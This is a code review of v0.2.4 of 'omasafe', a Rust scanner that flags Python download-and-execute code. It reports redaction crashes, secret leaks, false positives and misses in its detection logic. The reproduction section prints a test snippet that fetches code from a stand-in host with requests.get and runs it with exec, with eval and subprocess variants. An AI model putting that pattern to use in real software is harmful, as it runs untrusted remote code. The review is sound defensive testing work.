# v0.2.4 implementation review — 2026-09-07

Reviewed the uncommitted implementation against HEAD `92ed9c6` and the v0.2.4 plan/report contract. Recommendation: request changes. The implementation is not ready for the documented completion claim.

The findings below are implementation defects, independently of the outstanding release measurements and VM validation. No runtime code was changed during this review.

## Findings

### 1. [P1] Replacing URL secrets invalidates offsets and crashes scans

Location: `crates/omasafe-analyzer/src/detect/model.rs:173–200`; the CLI's separate redactor has the same query-offset pattern.

`redact_known_secrets` computes offsets, replaces substrings with differently sized placeholders, then uses the original offsets against the modified string. A Python download-execute finding whose URL is `https://longusername:longpassword@example.test/a` panics at line 180; `https://example.test/a?a=LONG_SECRET_A&b=LONG_SECRET_B` panics at line 190. Both scans exit 101 without a report. Reconstruct redacted output from immutable input spans, or recompute every affected offset. Cover multiple parameters, repeated headers, Unicode, and both redactors.

### 2. [P1] Fragment-only URL secrets remain in reported evidence

Location: `crates/omasafe-analyzer/src/detect/model.rs:183–200` and `crates/omasafe-cli/src/main.rs:4112–4134`.

Fragment redaction is nested inside the query-string branch. Scanning the normal Python download-execute case with `https://example.test/a#PRIVATE_FRAGMENT` emits `PRIVATE_FRAGMENT` unchanged in JSON evidence. The subsequent CLI transform also misses it. Handle fragments independently of whether `?` exists, before evidence is emitted or persisted. This is explicitly within the promised redaction support, not an arbitrary encoded-secret case.

### 3. [P1] Quoted Python text is reported as executable syntax

Location: `crates/omasafe-analyzer/src/detect/script/python_flow.rs:530–552`.

After binding `code` to downloaded text, `print('exec(code)')` produces a High `oma.python.download-execute` finding and exit 4 with `--fail-on high`. `call_sites` scans every opening parenthesis, including those inside string literals; the successful tree-sitter parse does not establish that these are call nodes. Traverse actual call nodes, excluding inert strings, rather than attributing `ast-dataflow` to this raw-text scan.

### 4. [P1] Assigning the result of a Python sink hides execution

Location: `crates/omasafe-analyzer/src/detect/script/python_flow.rs:373–377`.

For downloaded `code`, `eval(code)` is a supported sink, but `result = eval(code)` produces no Python finding and exits 0 under `--fail-on high`. The assignment branch evaluates provenance and continues before inspecting calls in the RHS. Inspect RHS sinks using the pre-assignment environment, then update the binding. Apply the same handling to assigned `exec`, `os.system`, and subprocess results.

### 5. [P1] Any subprocess argv containing `-c` becomes an interpreter sink

Location: `crates/omasafe-analyzer/src/detect/script/python_flow.rs:500–515`.

With downloaded `code`, `subprocess.run(['printf', '-c', code])` produces a High download-execute finding and exit 4. `literal_interpreter_code` searches for `-c` without checking the executable or its argument grammar. This passes downloaded bytes to an ordinary process argument; it does not establish code execution. Require a supported literal interpreter and the correct code operand position, preserving negative cases for other executables and argument roles.

### 6. [P2] Unrelated imported `get` functions become network producers

Location: `crates/omasafe-analyzer/src/detect/script/python_flow.rs:392–397`.

`from cache import get; code = get('cache-key').text; exec(code)` produces a High network download-execute finding. The fallback accepts any resolved import named `get` or `urlopen`, even when its qualified identity is outside the supported network APIs. Restrict production to the exact supported qualified functions after alias resolution; unknown libraries must remain unknown.

### 7. [P2] Function parameters do not shadow Python builtins or imports

Location: `crates/omasafe-analyzer/src/detect/script/python_flow.rs:128–133,160–164`.

`def f(exec):` followed by a local download and `exec(code)` still emits a High builtin-execution finding. Function headers are discarded, and the local shadow set contains assignment names only. The parameter could be any callback, so builtin execution has not been established. Retain parameter bindings and other lexical binders when constructing each scope, and use those bindings for producer and sink resolution.

### 8. [P2] Review selection still lets one family monopolize the report

Location: `crates/omasafe-cli/src/main.rs:7450–7464`.

The inner loop visits every path for one rule before advancing to another rule. In a scan with 1,030 Python download-execute files and one shell download-execute file, the review output retains 512 Python findings and zero shell findings. The 1,024 count cap is exhausted within the Python family before the shell family is visited; later canonical-tail halving further reduces the result. Take one candidate per rule per round, cycle that rule's paths across rounds, and preserve this priority through byte-budget reductions.

### 9. [P2] Summary completeness ignores omitted coverage and other details

Location: `crates/omasafe-cli/src/main.rs:7625–7685`.

Seventy Python files containing only `print("hello")` yield 70 coverage records before shaping. Review output retains 64, but `review_summary.coverage_gaps` still says `emitted:70, omitted:0`, and `presentation_complete` is true. The updater refreshes finding counts only and derives completeness solely from omitted findings. Recompute all retained collection counts and combine collection, field, and observation losses when deriving completeness. The flood case likewise reports 1,030 emitted coverage records while retaining none.

### 10. [P2] Declared cross-build suppression compatibility is not implemented

Location: `crates/omasafe-analyzer/src/policy.rs:172–174` and `crates/omasafe-core/src/suppress.rs:57–61`.

The policy always sets `review_compatibility_declaration_id` to null. The new suppression semantic/declaration fields are stored but never read by matching logic; CLI filtering still calls the old full-policy comparison. Therefore even a valid declared cosmetic rebuild cannot retain accepted reviews, contrary to C0's migration contract. Select and validate a matching declaration, and implement the scoped exact-policy-or-compatible-semantics comparison at all suppression call sites. Preserve conservative behavior for undeclared builds and legacy records.

### 11. [P2] The release semantic check accepts undeclared builds

Location: `scripts/check-analysis-semantics.py:38–59`.

Running the new check succeeds with the checked-in bootstrap declaration even though both fingerprints are null, both rule maps are empty, and its ID is not a canonical declaration digest. The script checks field presence, positive supplied revisions, and baseline links, but never compares against the current detector, rule catalog, parser projections, or baseline semantic changes. Consequently a detector edit with no revision/declaration update still passes this gate. Validate current build coverage and canonical identities, complete maps, and classification-specific revision/evidence requirements.

### 12. [P2] Semantic identities do not encode actual parser features or limit values

Location: `crates/omasafe-analyzer/src/rules.rs:173–188`.

The identity lists both enabled and disabled parser labels regardless of build configuration and serializes limit names instead of their values. The Python download-execute semantic digest is identically `fa30ea93c99850d9caeb2fbc1146c209225120db211e585b0387d81cb1e1a1fd` with all features and with no default features, although the latter cannot perform Python flow detection. This cannot serve as the promised compatibility boundary. Serialize actual per-rule feature state, grammar/runtime versions, and relevant numeric limits; verify the four feature projections.

## Validation and reproduction

Passed:

- `cargo test --workspace --all-features --quiet`
- `cargo test --workspace --no-default-features --quiet`
- `git diff --check` before adding this review

The semantic declaration check also exited 0; finding 11 explains why that result does not establish release compatibility.

Python reproductions used the parser-enabled CLI and inert source files. No reviewed source was executed. Unless otherwise specified, use this source and vary the final statement or URL as described above:

```python
import requests
code = requests.get('https://example.test/a').text
exec(code)
```

Run with:

```sh
cargo build -p omasafe-cli --all-features
target/debug/omasafe-cli scan-plugin --path /tmp/CASE_DIRECTORY --format json --fail-on high
```

Review-session probe scripts are `/tmp/omasafe-v024-review.py` and `/tmp/omasafe-v024-flood.py`. Captured inputs and outputs are in `/tmp/omasafe-v024-review-db2k9n9h` and `/tmp/omasafe-v024-flood-4a_adzfo`. These temporary artifacts are supplementary; the source cases above describe the reproductions independently.

The full release gate, package extraction matrix, sibling consumer, and VM checks were not run. Passing the existing tests does not cover the failing cases above.
